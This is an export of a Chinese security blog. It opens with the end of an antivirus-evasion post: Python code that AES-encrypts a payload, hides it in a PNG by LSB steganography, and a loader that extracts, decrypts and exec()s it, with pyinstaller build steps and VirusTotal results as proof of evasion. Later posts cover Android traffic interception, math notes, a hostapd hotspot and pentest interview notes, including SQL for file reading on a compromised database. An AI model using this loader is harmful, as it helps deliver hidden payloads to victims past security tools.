class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_binary</span>(<span class="params">self</span>):</span></span><br><span class="line">        l = <span class="built_in">int</span>(self.read_bits(<span class="number">64</span>), <span class="number">2</span>)</span><br><span class="line">        output = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            output += <span class="built_in">bytearray</span>([<span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>)])</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_shellcode</span>(<span class="params">payload,key,iv</span>):</span></span><br><span class="line">    <span class="comment"># 读取shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        shellcode = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The file length is &quot;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 压缩shellcode</span></span><br><span class="line">    gzip_shellcode = gzip.compress(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对明文进行 PKCS#7 填充</span></span><br><span class="line">    gzip_pad_shellcode = Padding.pad(gzip_shellcode, AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字符串转为字节类型并填充至合适的长度</span></span><br><span class="line">    key = Padding.pad(key.encode(), AES.block_size)</span><br><span class="line">    iv = Padding.pad(iv.encode(), AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 AES 加密器对象,使用CBC模式</span></span><br><span class="line">    aes_encrypt = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密压缩后的明文</span></span><br><span class="line">    ciphertext = aes_encrypt.encrypt(gzip_pad_shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入shellcode到文件中</span></span><br><span class="line">    output = payload+<span class="string">&quot;_aes&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(ciphertext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>,output,<span class="string">&quot; ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LSB</span>(<span class="params">ciphertext,img</span>):</span></span><br><span class="line">    <span class="comment"># 压缩密文</span></span><br><span class="line">    gzip_compress = gzip.compress(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The gzip_compress length is &quot;</span>,<span class="built_in">len</span>(gzip_compress))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    im = cv2.imread(img)</span><br><span class="line">    steg = LSBSteg(im)</span><br><span class="line">    img_bin = steg.encode_binary(gzip_compress)</span><br><span class="line">    output = img.replace(<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;_LSB.png&quot;</span>)</span><br><span class="line">    cv2.imwrite(output,img_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>,output,<span class="string">&quot; ok&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line">iv = <span class="string">&#x27;2317&#x27;</span></span><br><span class="line">payload = <span class="string">r&#x27;E:\4_Code\AST_bypass\demo2\code&#x27;</span></span><br><span class="line">img = <span class="string">r&quot;E:\4_Code\AST_bypass\demo2\1.png&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = encrypt_shellcode(payload,key,iv)</span><br><span class="line">LSB(ciphertext,img)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230613011933781.png" alt="image-20230613011933781"></p>
<p>图片对比，左边原图，右边隐写后的图。肉眼看基本没差别</p>
<p><img src="image-20230613012158390.png" alt="image-20230613012158390"></p>
<h1 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h1><p>负责运行的代码,这块代码需要打包成exe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run.py</span></span><br><span class="line"><span class="keyword">from</span> cv2 <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">from</span> gzip <span class="keyword">import</span> decompress</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Padding</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SteganographyException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LSBSteg</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, im</span>):</span></span><br><span class="line">        self.image = im</span><br><span class="line">        self.height, self.width, self.nbchannels = im.shape</span><br><span class="line">        self.size = self.width * self.height</span><br><span class="line">        </span><br><span class="line">        self.maskONEValues = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">128</span>]</span><br><span class="line">        <span class="comment">#Mask used to put one ex:1-&gt;00000001, 2-&gt;00000010 .. associated with OR bitwise</span></span><br><span class="line">        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>) <span class="comment">#Will be used to do bitwise operations</span></span><br><span class="line">        </span><br><span class="line">        self.maskZEROValues = [<span class="number">254</span>,<span class="number">253</span>,<span class="number">251</span>,<span class="number">247</span>,<span class="number">239</span>,<span class="number">223</span>,<span class="number">191</span>,<span class="number">127</span>]</span><br><span class="line">        <span class="comment">#Mak used to put zero ex:254-&gt;11111110, 253-&gt;11111101 .. associated with AND bitwise</span></span><br><span class="line">        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        self.curwidth = <span class="number">0</span>  <span class="comment"># Current width position</span></span><br><span class="line">        self.curheight = <span class="number">0</span> <span class="comment"># Current height position</span></span><br><span class="line">        self.curchan = <span class="number">0</span>   <span class="comment"># Current channel position</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_slot</span>(<span class="params">self</span>):</span><span class="comment">#Move to the next slot were information can be taken or put</span></span><br><span class="line">        <span class="keyword">if</span> self.curchan == self.nbchannels-<span class="number">1</span>: <span class="comment">#Next Space is the following channel</span></span><br><span class="line">            self.curchan = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> self.curwidth == self.width-<span class="number">1</span>: <span class="comment">#Or the first channel of the next pixel of the same line</span></span><br><span class="line">                self.curwidth = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> self.curheight == self.height-<span class="number">1</span>:<span class="comment">#Or the first channel of the first pixel of the next line</span></span><br><span class="line">                    self.curheight = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> self.maskONE == <span class="number">128</span>: <span class="comment">#Mask 1000000, so the last mask</span></span><br><span class="line">                        <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;No available slot remaining (image filled)&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>: <span class="comment">#Or instead of using the first bit start using the second and so on..</span></span><br><span class="line">                        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>)</span><br><span class="line">                        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.curheight +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.curwidth +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.curchan +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bit</span>(<span class="params">self</span>):</span> <span class="comment">#Read a single bit int the image</span></span><br><span class="line">        val = self.image[self.curheight,self.curwidth][self.curchan]</span><br><span class="line">        val = <span class="built_in">int</span>(val) &amp; self.maskONE</span><br><span class="line">        self.next_slot()</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.read_bits(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bits</span>(<span class="params">self, nb</span>):</span> <span class="comment">#Read the given number of bits</span></span><br><span class="line">        bits = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb):</span><br><span class="line">            bits += self.read_bit()</span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_binary</span>(<span class="params">self</span>):</span></span><br><span class="line">        l = <span class="built_in">int</span>(self.read_bits(<span class="number">64</span>), <span class="number">2</span>)</span><br><span class="line">        output = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            output += <span class="built_in">bytearray</span>([<span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>)])</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_shellcode</span>(<span class="params">ciphertext,key,iv</span>):</span></span><br><span class="line">    <span class="comment"># 读取加密后的shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&quot;aes_payload&quot;,&#x27;rb&#x27;)as f:</span></span><br><span class="line">    <span class="comment">#     ciphertext = f.read()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置key和iv</span></span><br><span class="line">    <span class="comment"># key = &#x27;this_is_y&#x27;</span></span><br><span class="line">    <span class="comment"># iv = &#x27;2317&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字符串转为字节类型并填充至合适的长度</span></span><br><span class="line">    key = Padding.pad(key.encode(), AES.block_size)</span><br><span class="line">    iv = Padding.pad(iv.encode(), AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 AES 加密器对象,使用CBC模式</span></span><br><span class="line">    aes_decrypt = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密压缩后的明文</span></span><br><span class="line">    plaintext = aes_decrypt.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对解密后的填充数据进行 PKCS#7 反填充</span></span><br><span class="line">    plaintext = Padding.unpad(plaintext, AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压明文</span></span><br><span class="line">    shellcode = decompress(plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&quot;code_decrypt&quot;,&#x27;wb&#x27;)as f:</span></span><br><span class="line">    <span class="comment">#     f.write(shellcode)</span></span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) != <span class="number">4</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = argv[<span class="number">1</span>]</span><br><span class="line">key = argv[<span class="number">2</span>]</span><br><span class="line">iv = argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">im_bin = imread(payload)</span><br><span class="line">steg = LSBSteg(im_bin)</span><br><span class="line"><span class="built_in">bin</span> = steg.decode_binary()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取到代码，解密出来，使用ast运行</span></span><br><span class="line"></span><br><span class="line">data = gzip.decompress(<span class="built_in">bin</span>)</span><br><span class="line">code = decrypt_shellcode(data,key,iv)</span><br><span class="line">run_code = <span class="built_in">compile</span>(code,<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(run_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>pyinstaller -F -w .\run.py</li>
<li>run.exe 图片路径 key iv</li>
</ul>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="image-20230613014603964.png" alt="image-20230613014603964"></p>
<p><a class="link" href="https://www.virustotal.com/gui/file/e9fa4eba8cf713d7e7a2195f83523b173aa7a050952f92561d6989c55320601c?nocache=1">https://www.virustotal.com/gui/file/e9fa4eba8cf713d7e7a2195f83523b173aa7a050952f92561d6989c55320601c?nocache=1<i class="fas fa-external-link-alt"></i></a><br><img src="image-20230613014614732.png" alt="image-20230613014614732"></p>
<p><a class="link" href="https://www.virustotal.com/gui/file/9ef00644d18c3fb23148c2382cea47dba25ff4029e33025d35e660e1e1096473?nocache=1">https://www.virustotal.com/gui/file/9ef00644d18c3fb23148c2382cea47dba25ff4029e33025d35e660e1e1096473?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230613014906753.png" alt="image-20230613014906753"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>最后有一个相对蛋疼的事情。打包出来的居然有50MB。</p>
<p>我突然就想到了当初为什么不用python做免杀了</p>
]]></content>
  </entry>
  <entry>
    <title>记录一种抓app的包的新方法</title>
    <url>/2023/02/04/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%8A%93app%E7%9A%84%E5%8C%85%E7%9A%84%E6%96%B0%E6%96%B9%E6%B3%95-This-is-Y/</url>
    <content><![CDATA[<p>记录一个新的安卓抓包思路<br>参考：<a class="link" href="https://www.52pojie.cn/thread-1701215-1-1.html">https://www.52pojie.cn/thread-1701215-1-1.html<i class="fas fa-external-link-alt"></i></a><br>简单来说就是：<br>    app &gt; vmos &gt; clash &gt;(无线局域网)&gt; burp</p>
<p>先说一下设备</p>
<ol>
<li>小米6（未root）</li>
<li>pu口袋校园</li>
</ol>
<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>首先配置好普通的局域网burp抓包环境，网上很多教程了，这里不细说。<br>配置好后，在浏览器输入网址，能抓到包就算成功。</p>
<p><img src="image-20230204001057748.png" alt="image-20230204001057748"></p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>之后安装clash，vmos两个app。在vmos里安装好需要抓包的app<br>clash配置文件如下，来自52的Fythem</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed-port: 7890</span><br><span class="line">allow-lan: false</span><br><span class="line">mode: global</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: 127.0.0.1:9090</span><br><span class="line">proxies:</span><br><span class="line">  - name: &quot;burp&quot;</span><br><span class="line">    type: http</span><br><span class="line">    server: 192.168.70.72</span><br><span class="line">    port: 8080</span><br><span class="line">proxy-groups:</span><br><span class="line">  - name: Proxy</span><br><span class="line">    type: select</span><br><span class="line">    proxies:</span><br><span class="line">      - burp</span><br></pre></td></tr></table></figure>



<p>将server和port改成burp监听的端口，随后保存，导入clash（推荐电脑保存文件后，开启web服务，把文件链接复制下来，然后clash选择url导入），选择该配置文件。点击代理，选择burp</p>
<p><img src="image-20230204001616084.png" alt="image-20230204001616084"></p>
<p>在vmos中打开需要抓包的app，然后在burp就可以看到包了。</p>
<p><img src="image-20230204002231746.png" alt="image-20230204002231746"></p>
<p>如果失败了，可以先检查一下各个需要填写监听信息的地方的ip和端口有没有出错，然后先从浏览器访问抓包开始检查。</p>
]]></content>
  </entry>
  <entry>
    <title>辗转相除法求模的逆元</title>
    <url>/2020/11/24/%E8%BE%97%E8%BD%AC%E7%9B%B8%E9%99%A4%E6%B3%95%E6%B1%82%E6%A8%A1%E7%9A%84%E9%80%86%E5%85%83-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14031026.html">源地址：https://www.cnblogs.com/This-is-Y/p/14031026.html<i class="fas fa-external-link-alt"></i></a></p>
<p>转载自百度文库：<a class="link" href="https://wenku.baidu.com/view/ada3397f2f60ddccdb38a04b.html?qq-pf-to=pcqq.c2c">https://wenku.baidu.com/view/ada3397f2f60ddccdb38a04b.html?qq-pf-to=pcqq.c2c<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<img src="1503868-20201124163147300-1074106118.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> <img src="1503868-20201124163136646-318434621.png" alt loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20201124163201013-1684584870.png" alt loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20201124163209866-978586584.png" alt loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20201124163221608-586631451.png" alt loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20201124163230029-1262419270.png" alt loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20201124163238215-138775964.png" alt loading="lazy"></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>通过hostapd配置wifi热点 （可以连接，无法上网）</title>
    <url>/2020/04/09/%E9%80%9A%E8%BF%87hostapd%E9%85%8D%E7%BD%AEwifi%E7%83%AD%E7%82%B9%20%EF%BC%88%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%EF%BC%8C%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%EF%BC%89-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12669291.html">源地址：https://www.cnblogs.com/This-is-Y/p/12669291.html<i class="fas fa-external-link-alt"></i></a></p>
<p>仅个人记录，不建议参考</p>
<p>用apt下载hostapd，dnsmasq</p>
<p>插入网卡，不需要开启监听模式</p>
<p>创建一个open.conf文件，写入</p>
<p>interface=wlan0</p>
<p>ssid=FreeWiFi</p>
<p>driver=nl80211</p>
<p>channel=1</p>
<p>hw_mode=g</p>
<p> </p>
<p>其中，interface是无线网卡接口名称，ssid是热点名称，driver是无线驱动，channel是信道（1-13）。hw_mode是值无线模式，g表示IEEE 802.11g，视情况修改</p>
<p>然后配置DHCP和DNS服务，这里我使用dnsmasq</p>
<p>在/etc/dnsmasq.conf 中修改</p>
<p>dhcp-range=192.168.229.100,192.168.229.250,12h</p>
<p>interface=wlan0</p>
<img src="1503868-20200409195129489-1110565996.png" alt>

<img src="1503868-20200409195144914-1897541284.png" alt>

<p> </p>
<p> interface是无线网卡接口名称</p>
<p>dhcp-range这个值来源于eth0的inet。</p>
<p>但是目前是什么意思还没搞清楚，有可能就是这个值导致热点无法上网</p>
<img src="1503868-20200409195358074-640149165.png" alt>

<p>然后就是重启服务，</p>
<p>systemctl restart dnsmasq</p>
<p>如果出现这种报错</p>
<p>Job for networking.service failed because the control process exited with error code.<br>See “systemctl status networking.service” and “journalctl -xe” for details.</p>
<p>就按提示输入systemctl status networking.service</p>
<p>一步一步排查，有可能是文件什么地方写错了</p>
<p> </p>
<p>正常情况下重启服务后，</p>
<p>再执行</p>
<p>nmcli radio wifi off</p>
<p>rfkill unblock wlan</p>
<p>ifconfig wlan0 192.168.229.134</p>
<p>hostapd open.conf</p>
<p>不出意外就是这个样子</p>
<img src="1503868-20200409201707274-2087290605.png" alt>

<p>然后就可以用手机连上这个wifi了。</p>
<p>但是我这个样子配置，目前该wifi可以连上，但是没有网络</p>
<p>待解决</p>
<p> </p>
<p> <br><br></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/18/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87-y-acer/</url>
    <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><ol>
<li>安全八股文，</li>
<li>shiro原理</li>
<li>sqlmap os-shell执行命令的原理</li>
<li>简历项目，印象较深的漏洞挖掘经历，应急能力等</li>
<li>登录页面如何渗透，思路。</li>
<li>sqlserver xmp_cmd</li>
</ol>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><ol>
<li>对SDL的认知，给一个业务场景(比如登录页面)，说说可以从哪些方面开展SDL建设</li>
<li>针对项目经历，谈谈过程，如何优化做得更好</li>
<li></li>
</ol>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>抽象问题，怎么做一次好的渗透测试</p>
<h1 id="北京"><a href="#北京" class="headerlink" title="北京"></a>北京</h1><p>shiro反序列化</p>
<p>log4j反序列化</p>
<p>fastjson反序列化-利用链流程分析</p>
<p>登录页面如何渗透，思路。</p>
<p>应急响应经验</p>
<p>CTF经验</p>
<p>护网经验</p>
<p>代码审计经验（挖到的漏洞）</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/11/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
    <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><ol>
<li>安全八股文，</li>
<li>shiro原理</li>
<li>sqlmap os-shell执行命令的原理</li>
<li>简历项目，印象较深的漏洞挖掘经历，应急能力等</li>
<li>登录页面如何渗透，思路。</li>
<li>sqlserver xmp_cmd</li>
</ol>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><ol>
<li>对SDL的认知，给一个业务场景(比如登录页面)，说说可以从哪些方面开展SDL建设</li>
<li>针对项目经历，谈谈过程，如何优化做得更好</li>
<li></li>
</ol>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>抽象问题，怎么做一次好的渗透测试</p>
<h1 id="北京"><a href="#北京" class="headerlink" title="北京"></a>北京</h1><p>shiro反序列化</p>
<p>log4j反序列化</p>
<p>fastjson反序列化-利用链流程分析</p>
<p>登录页面如何渗透，思路。</p>
<p>应急响应经验</p>
<p>CTF经验</p>
<p>护网经验</p>
<p>代码审计经验（挖到的漏洞）</p>
<p>阿里云 OSS 对象存储攻防 <a class="link" href="https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss#4bucket-object%E9%81%8D%E5%8E%86">https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss#4bucket-object%E9%81%8D%E5%8E%86<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>面试题查漏补缺</title>
    <url>/2021/06/10/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA-This-is-Y/</url>
    <content><![CDATA[<h2 id="1-快速判断目标是Linux还是Windows"><a href="#1-快速判断目标是Linux还是Windows" class="headerlink" title="1. 快速判断目标是Linux还是Windows"></a>1. 快速判断目标是Linux还是Windows</h2><p>linux对大小写敏感，<br>win不敏感，<br>目录修改一下字母大小写，如果正常访问，大概率是win，不能就可能是linux</p>
<h2 id="2-站库分离"><a href="#2-站库分离" class="headerlink" title="2. 站库分离"></a>2. 站库分离</h2><p><a class="link" href="https://blog.csdn.net/Vdieoo/article/details/109515514">https://blog.csdn.net/Vdieoo/article/details/109515514<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li><ul>
<li>从 web 网站打入进而打站库分离的数据库，内网渗透<br>①. 从 web 入口通常就是通过网站的各种漏洞来 getshell，比如文件上传、命令执行、代码        执行、还有 SQL 注入写入一句话（into outfile、日志备份等）。<br>②. 在获得 web 权限或者有诸如文件读取等漏洞时，我们还读数据库配置文件、对数据库内        容分析、查找数据库备份，进而对数据库目标 ip 进行渗透，以便后续操作</li>
</ul>
</li>
<li>从数据库打入进而打站库分离的 web 网站，内网渗透<br>①. MySql<br>（1）定位 web 端 ip 地址</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;</span><br></pre></td></tr></table></figure>

<p>在得到了 web 端的 ip 我们可以进而对 web 端进行渗透。<br>（2）load_file () 获取数据库所在服务器的敏感信息<br>如果没有 secure_file_priv 参数的限制（MySQL5.7 以下）我们还可以用 load_file() 函数对文件内容进行读取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;test.txt&#39;);</span><br></pre></td></tr></table></figure>

<p>②. MsSql<br>（1） 判断是否站库分离<br>得到客户端主机名: select host_name();<br>得到服务端主机名: select @@servername;<br>根据结果判断是否分离，结果一样就可能站库同服务器，结果不一样就是站库分离。</p>
<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3. CSRF"></a>3. CSRF</h2><p>Cross-site requestforgery，也就是跨站请求伪造<br>XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，XSS来自用户的手，完成一些操作或者是泄露信息，CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。两者的关系属于 ，XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br>常见的CSRF在用户修改密码的地方</p>
<p><img src="image-20210610101822012.png" alt="image-20210610101822012"></p>
<p>防御：<br>来自：<a class="link" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html<i class="fas fa-external-link-alt"></i></a><br>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。<br>CSRF的两个特点：</p>
<ul>
<li>CSRF（通常）发生在第三方域名。</li>
<li>CSRF攻击者不能获取到Cookie等信息，只是使用。<br>针对这两点，我们可以专门制定防护策略，如下：</li>
<li>阻止不明外域的访问<br>同源检测<br>Samesite Cookie</li>
<li>提交时要求附加本域才能获取的信息<br>CSRF Token<br>双重Cookie验证<br>CSRF TOKEN：<br>CSRF Token的防护策略分为三个步骤：</li>
</ul>
<ol>
<li>将CSRF Token输出到页面中</li>
<li>页面提交的请求携带这个Token</li>
<li>服务器验证Token是否正确</li>
</ol>
<h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4. SSRF"></a>4. SSRF</h2><p>Server Side RequestForgery，服务器端请求伪造<br>它是一种<strong>由攻击者构造形成，由服务端发起请求</strong>的一个安全漏洞。因为它是由服务端发起的，所以它<strong>能够请求到与它相连但与外网隔离的内部系统</strong>。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能）且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p>SSRF的受害对象主要是一些服务器所连接的一些内网设备，如<strong>内网的应用程序</strong>，<strong>通过file协议获得内部网络的资料</strong>等</p>
<p>防御：</p>
<p>1.将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p>
<p>2.建立URL白名单，只允许白名单上内容通过过滤。</p>
<p>3.建立内网IP黑名单，阻止对该IP的请求。</p>
<p>4.对返回内容进行过滤，减少敏感内容暴露。</p>
<p>5.禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p>
<h2 id="5-XSS防御"><a href="#5-XSS防御" class="headerlink" title="5. XSS防御"></a>5. XSS防御</h2><p>HttpOnly 最早是由微软提出，并在 IE 6 中实现的，至今已经逐渐成为一个标准，各大浏览器都支持此标准。具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在与服务端交互的时候，Http Request 包中仍然会带上这个 Cookie 信息，即我们的正常交互不受影响。</p>
<p>XSS的防御分输入和输出两方面<br><a class="link" href="https://juejin.cn/post/6844903684900388871#heading-7">https://juejin.cn/post/6844903684900388871#heading-7<i class="fas fa-external-link-alt"></i></a></p>
<p>输入</p>
<p>格式检验，例如用户名只能以字母和数字组合，手机号码只能有 11 位且全部为数字，否则即为非法。<br>白名单检测<br>匹配XSS特征</p>
<p>输出</p>
<p>HTMLEncode<br>JavaScriptEncode</p>
<h2 id="6-sql预编译"><a href="#6-sql预编译" class="headerlink" title="6. sql预编译"></a>6. sql预编译</h2><p>一条sql语句的执行需要经过语义解析，制定执行计划，执行并返回结果。</p>
<p>预编译是指把要执行的sql语句先进行一个解析,解析语法以及确定查询范围还有查找的返回结果类型，就是确定了查询的方式，把命令和参数进行了分离，使用预编译的sql语句来进行查询直接进行执行计划，不会在进行语义解析，也就是DB不会在进行编译，而是直接执行编译过的sql。只需要替换掉参数部分。</p>
<ol>
